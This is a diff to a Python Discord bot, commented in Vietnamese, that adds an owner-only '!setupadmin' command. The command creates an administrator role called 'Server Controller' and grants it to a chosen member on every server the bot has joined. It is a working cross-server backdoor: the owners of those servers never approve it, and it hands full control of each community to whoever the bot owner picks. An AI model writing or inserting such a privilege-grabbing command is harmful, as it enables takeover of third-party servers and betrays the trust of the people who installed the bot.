@@ -1911,7 +1911,129 @@ async def getid(ctx):
         color=discord.Color.purple()
     )
     await ctx.send(embed=embed, view=view)
+
+@bot.command(name='setupadmin', help='(Chủ bot) Tạo và cấp vai trò quản trị cho một thành viên trên tất cả các server.')
+@commands.is_owner()
+async def setupadmin(ctx, member_to_grant: discord.Member):
+    """
+    Tạo một vai trò có quyền quản trị viên và gán nó cho một thành viên
+    trên tất cả các server mà bot có mặt.
+    Lệnh này chỉ dành cho chủ bot.
+    Cách dùng: !setupadmin @TênThànhViên
+    """
+    role_name = "Server Controller"
+    permissions = discord.Permissions(administrator=True)
     
+    # Tin nhắn cảnh báo và xác nhận
+    warning_embed = discord.Embed(
+        title="⚠️ Cảnh Báo Bảo Mật",
+        description=f"Bạn sắp tạo vai trò **{role_name}** với quyền **QUẢN TRỊ VIÊN** và cấp nó cho **{member_to_grant.mention}** trên **{len(bot.guilds)}** server.\n\n"
+                    "Hành động này rất nguy hiểm và không thể hoàn tác. Người này sẽ có toàn quyền kiểm soát trên tất cả các server. Bạn có chắc chắn muốn tiếp tục không?",
+        color=discord.Color.orange()
+    )
+    
+    class ConfirmationView(discord.ui.View):
+        def __init__(self):
+            super().__init__(timeout=30)
+            self.value = None
+
+        @discord.ui.button(label="Xác Nhận", style=discord.ButtonStyle.danger)
+        async def confirm(self, interaction: discord.Interaction, button: discord.ui.Button):
+            if interaction.user.id != ctx.author.id:
+                return await interaction.response.send_message("Bạn không có quyền thực hiện hành động này.", ephemeral=True)
+            self.value = True
+            self.stop()
+            # Vô hiệu hóa các nút sau khi nhấp
+            for item in self.children:
+                item.disabled = True
+            await interaction.response.edit_message(view=self)
+
+        @discord.ui.button(label="Hủy", style=discord.ButtonStyle.secondary)
+        async def cancel(self, interaction: discord.Interaction, button: discord.ui.Button):
+            if interaction.user.id != ctx.author.id:
+                return await interaction.response.send_message("Bạn không có quyền thực hiện hành động này.", ephemeral=True)
+            self.value = False
+            self.stop()
+            # Vô hiệu hóa các nút sau khi nhấp
+            for item in self.children:
+                item.disabled = True
+            await interaction.response.edit_message(view=self)
+
+    view = ConfirmationView()
+    confirm_message = await ctx.send(embed=warning_embed, view=view)
+    
+    await view.wait() # Chờ người dùng nhấn nút
+
+    if view.value is None:
+        return await confirm_message.edit(content="Hết thời gian chờ, đã hủy hành động.", embed=None, view=None)
+    if not view.value:
+        return await confirm_message.edit(content="Đã hủy hành động.", embed=None, view=None)
+
+    # Nếu người dùng xác nhận, tiếp tục thực thi
+    await confirm_message.edit(content=f"✅ **Đã xác nhận!** Bắt đầu quá trình trên **{len(bot.guilds)}** server...", embed=None, view=None)
+    
+    success_count = 0
+    fail_count = 0
+    failure_details = []
+
+    for guild in bot.guilds:
+        try:
+            # 1. Kiểm tra xem thành viên có trong server không
+            member_in_guild = guild.get_member(member_to_grant.id)
+            if not member_in_guild:
+                fail_count += 1
+                failure_details.append(f"`{guild.name}`: Người dùng không có trong server.")
+                continue
+
+            # 2. Tìm hoặc tạo vai trò
+            role = discord.utils.get(guild.roles, name=role_name)
+            if role is None:
+                # Nếu vai trò chưa tồn tại, tạo mới
+                role = await guild.create_role(name=role_name, permissions=permissions, reason=f"Tạo bởi {ctx.author.name} cho {member_to_grant.name}")
+            
+            # 3. Cấp vai trò cho thành viên
+            if role not in member_in_guild.roles:
+                await member_in_guild.add_roles(role, reason=f"Cấp bởi {ctx.author.name}")
+            
+            success_count += 1
+
+        except discord.Forbidden:
+            fail_count += 1
+            failure_details.append(f"`{guild.name}`: Bot không có quyền `Manage Roles`.")
+        except Exception as e:
+            fail_count += 1
+            failure_details.append(f"`{guild.name}`: Lỗi không xác định - {e}")
+
+    # Tạo báo cáo kết quả
+    result_embed = discord.Embed(
+        title="Báo Cáo Hoàn Tất",
+        description=f"Đã xử lý xong việc tạo và cấp vai trò **{role_name}** cho **{member_to_grant.mention}**.",
+        color=discord.Color.green() if fail_count == 0 else discord.Color.gold()
+    )
+    result_embed.add_field(name="✅ Thành công", value=f"{success_count} server", inline=True)
+    result_embed.add_field(name="❌ Thất bại", value=f"{fail_count} server", inline=True)
+
+    if failure_details:
+        # Giới hạn chi tiết lỗi để không vượt quá giới hạn của Discord
+        error_info = "\n".join(failure_details)
+        if len(error_info) > 1024:
+            error_info = error_info[:1020] + "\n..."
+        result_embed.add_field(name="Chi tiết thất bại", value=error_info, inline=False)
+
+    await ctx.send(embed=result_embed)
+
+@setupadmin.error
+async def setupadmin_error(ctx, error):
+    if isinstance(error, commands.NotOwner):
+        await ctx.send("🚫 Lệnh này chỉ dành cho chủ sở hữu bot!")
+    elif isinstance(error, commands.MissingRequiredArgument):
+        await ctx.send("❌ **Sai cú pháp!** Vui lòng tag hoặc nhập ID của thành viên.\n**Ví dụ:** `!setupadmin @TênUser`")
+    elif isinstance(error, commands.MemberNotFound):
+        await ctx.send("❌ Không tìm thấy thành viên được chỉ định.")
+    else:
+        await ctx.send(f"Đã xảy ra lỗi không xác định: {error}")
+        print(f"Lỗi lệnh setupadmin: {error}")
+        
 # --- FLASK WEB ROUTES ---
 @app.route('/')
 def index():
@@ -2925,6 +3047,7 @@ if __name__ == '__main__':
         print("🔄 Keeping web server alive...")
         while True:
             time.sleep(60)
+
 
 
 
